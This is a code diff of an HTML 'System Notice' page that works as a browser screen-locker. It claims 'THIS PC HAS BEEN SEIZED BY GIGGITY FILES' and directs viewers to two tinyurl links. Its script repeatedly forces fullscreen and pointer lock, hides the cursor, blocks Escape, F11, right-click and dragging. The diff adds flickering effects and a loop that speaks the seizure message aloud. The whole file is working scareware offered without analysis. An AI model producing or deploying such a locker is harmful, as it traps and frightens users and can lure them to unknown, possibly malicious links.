@@ -1,101 +1,137 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>System Notice</title>
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: black;
-      color: red;
-      font-family: sans-serif;
-      text-align: center;
-      cursor: none; /* hide mouse */
-      user-select: none;
-    }
-    h1 { font-size: 3em; margin: 0.5em 0; }
-    p { font-size: 1.5em; }
-    .urls {
-      font-family: monospace;
-      font-size: 1.3em;
-      color: yellow;
-    }
-  </style>
+<meta charset="utf-8">
+<title>System Notice</title>
+<style>
+  @keyframes pulse {
+    0% { background-color: black; }
+    50% { background-color: #2a0000; }
+    100% { background-color: black; }
+  }
+  @keyframes flicker {
+    0%,19%,21%,23%,25%,54%,56%,100% { opacity: 1; }
+    20%,22%,24%,55% { opacity: 0.3; }
+  }
+
+  html, body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: monospace;
+    user-select: none;
+    cursor: none;
+    animation: pulse 2s infinite;
+    color: red;
+    text-align: center;
+  }
+
+  h1 {
+    font-size: 3em;
+    margin: 0.5em 0;
+    text-shadow: 0 0 20px red;
+    animation: flicker 0.15s infinite;
+  }
+
+  p { font-size: 1.5em; margin: 0.5em 0; animation: flicker 0.3s infinite; }
+  .urls {
+    font-family: monospace;
+    font-size: 1.3em;
+    color: yellow;
+    user-select: text;
+    animation: flicker 0.4s infinite;
+  }
+</style>
 </head>
 <body>
-  <div>
-    <h1>THIS PC HAS BEEN SEIZED BY GIGGITY FILES</h1>
-    <p>Go to the following addresses exactly as written (not clickable):</p>
-    <p class="urls">
-      tinyurl.com/ggtfiles<br>
-      tinyurl.com/quagfile
-    </p>
-  </div>
+<div>
+  <h1>THIS PC HAS BEEN SEIZED BY GIGGITY FILES</h1>
+  <p>Visit the following addresses exactly as written:</p>
+  <p class="urls">
+    tinyurl.com/ggtfiles<br>
+    tinyurl.com/quagfile
+  </p>
+</div>
 
-  <script>
-    (function() {
-      const root = document.documentElement;
+<script>
+(function() {
+  const root = document.documentElement;
 
-      function requestFS() {
-        const req = root.requestFullscreen || root.webkitRequestFullscreen || root.msRequestFullscreen;
-        if (req) req.call(root).catch(()=>{});
-      }
+  function requestFS() {
+    const req = root.requestFullscreen || root.webkitRequestFullscreen || root.msRequestFullscreen;
+    if (req) req.call(root).catch(()=>{});
+  }
 
-      function keepFS() {
-        if (!document.fullscreenElement &&
-            !document.webkitFullscreenElement &&
-            !document.msFullscreenElement) {
-          requestFS();
-        }
-      }
+  function keepFS() {
+    if (!document.fullscreenElement &&
+        !document.webkitFullscreenElement &&
+        !document.msFullscreenElement) {
+      requestFS();
+    }
+  }
 
-      // Try to lock pointer (mouse trap)
-      function lockPointer() {
-        const lock = root.requestPointerLock || root.mozRequestPointerLock;
-        if (lock) lock.call(root);
-      }
+  function lockPointer() {
+    const lock = root.requestPointerLock || root.mozRequestPointerLock;
+    if (lock) lock.call(root);
+  }
 
-      // Initial attempt
+  function speakMessage() {
+    if (!('speechSynthesis' in window)) return;
+    if (window.speechSynthesis.speaking) return;
+    const msg = new SpeechSynthesisUtterance(
+      "This PC has been seized by Giggity Files. Visit tinyurl dot com slash g g t files, or tinyurl dot com slash quagfile."
+    );
+    msg.rate = 1.4;   // faster
+    msg.pitch = 0.2;  // very deep
+    msg.volume = 1.0;
+    window.speechSynthesis.speak(msg);
+  }
+
+  // Loop voice warning every 8 seconds
+  setInterval(speakMessage, 8000);
+
+  // Initial attempts
+  requestFS();
+  lockPointer();
+  speakMessage();
+
+  // Keep enforcing fullscreen & pointer lock
+  setInterval(() => {
+    keepFS();
+    lockPointer();
+    speakMessage();
+  }, 500);
+
+  // Retry on user interaction
+  ["click","keydown","pointerdown","touchstart","mousemove"].forEach(evt => {
+    window.addEventListener(evt, () => {
       requestFS();
       lockPointer();
+      speakMessage();
+    }, {passive:true});
+  });
 
-      // Keep enforcing fullscreen & pointer lock
-      setInterval(() => {
-        keepFS();
-        lockPointer();
-      }, 500);
+  // Detect exit and re-enter fullscreen
+  ["fullscreenchange","webkitfullscreenchange","msfullscreenchange"].forEach(evt => {
+    document.addEventListener(evt, keepFS, {passive:true});
+  });
 
-      // Also re-try on interaction
-      ["click","keydown","pointerdown","touchstart","mousemove"].forEach(evt => {
-        window.addEventListener(evt, () => {
-          requestFS();
-          lockPointer();
-        }, {passive:true});
-      });
+  // Block Escape and F11
+  window.addEventListener("keydown", e => {
+    if (["Escape","F11"].includes(e.key)) {
+      e.preventDefault();
+      requestFS();
+      lockPointer();
+      speakMessage();
+    }
+  }, true);
 
-      // Detect exit
-      ["fullscreenchange","webkitfullscreenchange","msfullscreenchange"].forEach(evt => {
-        document.addEventListener(evt, keepFS, {passive:true});
-      });
-
-      // Block Esc and other exits
-      window.addEventListener("keydown", e => {
-        if (["Escape","F11"].includes(e.key)) {
-          e.preventDefault();
-          requestFS();
-          lockPointer();
-        }
-      }, true);
-
-      // Block context menu + dragging
-      window.addEventListener("contextmenu", e => e.preventDefault());
-      window.addEventListener("dragstart", e => e.preventDefault());
-
-    })();
-  </script>
+  // Block context menu & drag
+  window.addEventListener("contextmenu", e => e.preventDefault());
+  window.addEventListener("dragstart", e => e.preventDefault());
+})();
+</script>
 </body>
 </html>
